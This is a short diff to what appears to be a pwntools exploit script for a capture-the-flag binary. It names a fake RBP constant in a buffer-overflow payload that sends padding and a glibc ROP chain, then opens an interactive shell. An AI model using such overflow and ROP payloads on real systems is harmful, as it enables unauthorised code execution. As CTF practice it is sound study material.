@@ -30,7 +30,8 @@ chain = [
     glibc_base_addr+glibc_r.r13.address, 0,
     glibc_base_addr+0xd511f
 ]
-p.sendlineafter(b"Wanna Cry about that? ", b'A'*0x20+p64(0x404800)+b''.join([p64(c) for c in chain]))
+FAKE_RBP = 0x404800
+p.sendlineafter(b"Wanna Cry about that? ", b'A'*0x20+p64(FAKE_RBP)+b''.join([p64(c) for c in chain]))
 
 p.interactive()
 
